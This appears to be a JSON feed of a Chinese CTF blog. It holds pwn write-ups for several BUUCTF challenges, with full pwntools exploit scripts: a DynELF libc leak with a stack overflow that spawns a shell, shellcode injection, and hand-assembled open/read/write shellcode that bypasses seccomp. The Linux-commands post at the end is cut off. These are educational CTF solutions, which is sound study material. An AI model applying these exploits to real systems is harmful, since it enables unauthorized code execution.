{
    "version": "https://jsonfeed.org/version/1",
    "title": "Blog • All posts by \"ctf\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/bjdctf_2020_router/",
            "url": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/bjdctf_2020_router/",
            "title": "bjdctf_2020_router（）",
            "date_published": "2023-09-24T09:08:15.000Z",
            "content_html": "<h1 id=\"1分析程序\"><a class=\"anchor\" href=\"#1分析程序\">#</a> 1. 分析程序</h1>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/24/pP7E8Fx.png\" alt=\"\" /><br />\n64 位程序，开启了 NX</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/25/pP7Eg1S.png\" alt=\"\" /><br />\n<img data-src=\"https://z1.ax1x.com/2023/09/25/pP7EIkq.md.png\" alt=\"\" /></p>\n<p>发现可以 case3 中可以溢出 2 个字节，<br />\n而 case 1 中有后门函数，dest 可以写入的大小非常大，想到利用 case3 不断返回反复写入 getshell 的代码</p>\n<p>或者利用格式化字符串修改 dest 的值，然后写入</p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/23/pwn/%E5%88%B7%E9%A2%98/BUUCTF/jarvisoj_level4/",
            "url": "https://vvwwvv.cn/2023/09/23/pwn/%E5%88%B7%E9%A2%98/BUUCTF/jarvisoj_level4/",
            "title": "jarvisoj_level4（DynELF）",
            "date_published": "2023-09-23T09:08:15.000Z",
            "content_html": "<h1 id=\"1分析程序\"><a class=\"anchor\" href=\"#1分析程序\">#</a> 1. 分析程序</h1>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/23/pPTNUzQ.png\" alt=\"\" /><br />\n32 位程序没有开启 NX 和 pie</p>\n<p>ida 查看一下</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/23/pPTNrd0.png\" alt=\"\" /></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/23/pPTNsoV.png\" alt=\"\" /></p>\n<p>发现 vuln 函数可以进行溢出，但是没有发现后门函数，所以我们利用 ret2libc</p>\n<p>呃。。。</p>\n<p>利用 ret2libc 没有打通，换个方式利用 DynELF</p>\n<h1 id=\"2利用dynelf\"><a class=\"anchor\" href=\"#2利用dynelf\">#</a> 2. 利用 DynELF</h1>\n<p>构造 <code>leak</code>  函数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span>add<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#add 为想泄露的函数地址</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">140</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    fun_add<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> fun_add</pre></td></tr></table></figure><p>实例化 <code>DynELF</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>d<span class=\"token operator\">=</span>DynELF<span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">,</span>elf<span class=\"token operator\">=</span>e<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>获取 <code>system</code>  和 <code>read</code>  地址 (因为程序里没有 <code>/bin/sh</code>  需要我们自己写入)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>system<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"libc\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>read<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'libc'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"3exp\"><a class=\"anchor\" href=\"#3exp\">#</a> 3.exp:</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./level4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote(\"node4.buuoj.cn\",28089)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./level4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>write_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>write_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>read_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>bbs<span class=\"token operator\">=</span><span class=\"token number\">0x804A024</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>vuln<span class=\"token operator\">=</span><span class=\"token number\">0x804844B</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span>add<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">140</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    fun_add<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> fun_add</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>d<span class=\"token operator\">=</span>DynELF<span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">,</span>elf<span class=\"token operator\">=</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>system<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"libc\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>read<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">140</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>read<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>bbs<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>打通本地<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pPTRbfH.png\" alt=\"\" /></p>\n<p>打远程靶机<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pPTRO1A.md.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/23/pwn/%E5%88%B7%E9%A2%98/BUUCTF/mrctf2020_shellcode/",
            "url": "https://vvwwvv.cn/2023/09/23/pwn/%E5%88%B7%E9%A2%98/BUUCTF/mrctf2020_shellcode/",
            "title": "mrctf2020_shellcode（DynELF）",
            "date_published": "2023-09-23T09:08:15.000Z",
            "content_html": "<h1 id=\"1查看程序信息\"><a class=\"anchor\" href=\"#1查看程序信息\">#</a> 1. 查看程序信息</h1>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/24/pP7iern.png\" alt=\"\" /><br />\n64 位程序，发现开启了 PIE</p>\n<p>利用 ida 查看一下<br />\n发现转 c 语言失败，那就分析汇编<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pP7iJM9.png\" alt=\"\" /></p>\n<p>可以看到 buf 有 0x410 的大小，而输入只有 0x400，无法溢出<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pP7FTfO.png\" alt=\"\" /></p>\n<h1 id=\"2分析汇编\"><a class=\"anchor\" href=\"#2分析汇编\">#</a> 2. 分析汇编</h1>\n<p>这里解释汇编代码的含义<br />\n首先要了解 <code>jg</code>  命令的含义</p>\n<pre><code>jg：比较结果是&quot;&gt;&quot;则跳转，所以我们需要查看前面的 cmp的比较结果\n</code></pre>\n<p>read 函数的返回值是输入值的大小并且会保存到 eax 中<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pP7A3RS.png\" alt=\"\" /></p>\n<p>输入 shellcode 后会满足长度判断，使跳转到 <code>loc_11D6</code></p>\n<p>LEA 指令的作用是取 opera2 的地址，然后把这个地址赋给 opera1</p>\n<pre><code>lea rax ,[rbp+buf]  //LEA指令此处取 栈顶(rbp+buf) 的地址 ,来给rax \n</code></pre>\n<p>call 指令会进行跳转，意味着就跳转到栈顶然后执行<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pP7AIzD.md.png\" alt=\"\" /></p>\n<p>这就很明了了，我们直接输入 <code>shellcode</code>  然后长度可以进行跳转，并且 <code>call</code>  又会去再 <code>shellcode</code>  起始处，也就是栈顶执行我们输入的 <code>shellcode</code> , 这样就直接获得 shell 了</p>\n<h1 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp:</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./mrctf2020_shellcode'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"magic!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>直接打通本地<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pP7AOot.md.png\" alt=\"\" /></p>\n<p>远程<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/24/pP7AxW8.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/22/pwn/%E5%88%B7%E9%A2%98/BUUCTF/orw/",
            "url": "https://vvwwvv.cn/2023/09/22/pwn/%E5%88%B7%E9%A2%98/BUUCTF/orw/",
            "title": "pwnable_orw（手写汇编之shellcode，沙盒机制）",
            "date_published": "2023-09-22T09:08:15.000Z",
            "content_html": "<h1 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h1>\n<p>32 位程序，没有开启 NX，初步认为可以利用 <code>shellcode</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmrOe.png\" alt=\"\" /></p>\n<p>ida 查看<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTm6wd.png\" alt=\"\" /><br />\n看到有一个  <code>orw_seccomp()</code> ， <code>seccomp函数</code> 是一个沙盒机制</p>\n<p>进去查看（关于沙盒详情见文章 <code>沙盒机制</code> ）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmWfP.png\" alt=\"\" /></p>\n<p>利用工具 <code>seccomp-tools</code>  查看具体过滤情况，<br />\n使用命令 <code>seccomp-tools dump ./orw</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmaJx.png\" alt=\"\" /></p>\n<p>看到我们可以使用  <code>open/read/write</code>  函数，可以写入执行这几个的函数的 <code>shellcode</code>  来读取 <code>flag</code></p>\n<ol>\n<li>通过 <code>open</code>  打开 flag 文件</li>\n<li>利用 <code>read</code>  读取 flag 到某一地址</li>\n<li>利用 <code>write</code>  输出这个地址的 flag 即可</li>\n</ol>\n<h1 id=\"2shellcode-构造\"><a class=\"anchor\" href=\"#2shellcode-构造\">#</a> 2.shellcode 构造</h1>\n<p>利用系统调用方式：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTuPKS.png\" alt=\"\" /></p>\n<h2 id=\"1利用shellcraft构造\"><a class=\"anchor\" href=\"#1利用shellcraft构造\">#</a> 1. 利用 shellcraft 构造</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode<span class=\"token operator\">=</span>shellcraft<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./flag\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token string\">'eax'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'esp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#此处 eax 为 3（打开 0，1，2 标准输入，标准输出，标准错误）</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#read 函数的 fd 之所以是 3，是因为默认情况下，0,1,2 这三个句柄对应的是标准输入，标准输出，标准错误，系统进程默认会打开 0，1，2 这三个文件描述符。所以通常我们 open 的返回值是从 3 开始的（系统调用返回值会保存在 eax 中）</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>shellcraft<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'esp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#记得要用 asm 转成汇编</span></pre></td></tr></table></figure><h2 id=\"2手动构造\"><a class=\"anchor\" href=\"#2手动构造\">#</a> 2. 手动构造</h2>\n<p>1. 调用 open 打开 flag 文件：88</p>\n<p>调用函数为 <code>sys_open(const *path,0,0)</code></p>\n<pre><code>push 0x0 #字符串是以\\x00结尾\npush 0x67616c66 #flag的ascill码，小端序（66 &quot;f&quot; ,6c &quot;l&quot; ,61 &quot;a&quot; ,67 &quot;g&quot;）\nmov ebx,esp\nxor    ecx,ecx\nxor    edx,edx\nmov  eax, 0x5\nint     0x80\n</code></pre>\n<p>这里解释为什么先要 <code>push 0x0</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTl3y6.png\" alt=\"\" /></p>\n<p>2. 调用 read 读取 flag</p>\n<p>调用函数为 <code>read(0x3,esp,0x100)</code> (0x3 为文件描述符 0,1,2，写入到 esp，这一部分 esp 没有进行调用不会被影响)</p>\n<pre><code>mov ebx,0x3\nmov ecx,esp\nmov edx, 0x100\nmov eax,0x3\nint     0x80\n</code></pre>\n<p>3. 调用 write 将 flag 从上面写入的位置输出到屏幕</p>\n<p>调用的函数为 <code>write(0x1,esp,0x100)</code></p>\n<pre><code>mov ebx,0x1\nmov ecx,esp\nmov edx,0x100\nmov eax, 0x4\nint   0x80\n\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shellcode<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\" ;    ;    ;      ; \"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"只有这里最后一个不用加分号\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里就构造完毕 shellcode 了</p>\n<h1 id=\"3exp\"><a class=\"anchor\" href=\"#3exp\">#</a> 3.exp:</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./orw')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27810</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#shellcode = (shellcraft.open(\"./flag\"))</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#shellcode+=(shellcraft.read('eax','esp',100))</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#shellcode+=(shellcraft.write(1,'esp',100))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>shellcode<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push 0x0 ;push 0x67616c66 ;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax, 0x5;int 0x80;\"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>shellcode<span class=\"token operator\">+=</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov ebx,0x3;mov ecx,0x804A0A0;mov edx, 0x100;mov eax,0x3;int 0x80;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>shellcode<span class=\"token operator\">+=</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov ebx,0x1;mov ecx,0x804A0A0;mov edx,0x100;mov eax, 0x4;int 0x80\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"your shellcode:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#payload1=p32()+p32()+p32()+p32()</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#payload1=p64()+p64()+p64()+p64()</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,\"b *\")</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#gdb.attach(pid)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#p.recvuntil(\"\")</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#payload2=p32()+p32()+p32()+p32()</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#payload2=p64()+p64()+p64()+p64()</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#p.sendline(payload2)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>本地仍然打不通，应该是环境问题</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/23/pPTY8OI.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/19/Linux/Linux%E5%91%BD%E4%BB%A4%E5%92%8C%E5%87%BD%E6%95%B0/",
            "url": "https://vvwwvv.cn/2023/09/19/Linux/Linux%E5%91%BD%E4%BB%A4%E5%92%8C%E5%87%BD%E6%95%B0/",
            "title": "Linux命令和函数",
            "date_published": "2023-09-19T12:05:56.000Z",
            "content_html": "<h1 id=\"1linux执行多个命令shell命令\"><a class=\"anchor\" href=\"#1linux执行多个命令shell命令\">#</a> 1.Linux 执行多个命令（shell 命令）</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#逐条执行命令</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span>  <span class=\"token comment\">#即使命令执行错误也不影响后面的命令继续执行</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#前面的成功执行后面才执行</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> echoo <span class=\"token number\">2</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token 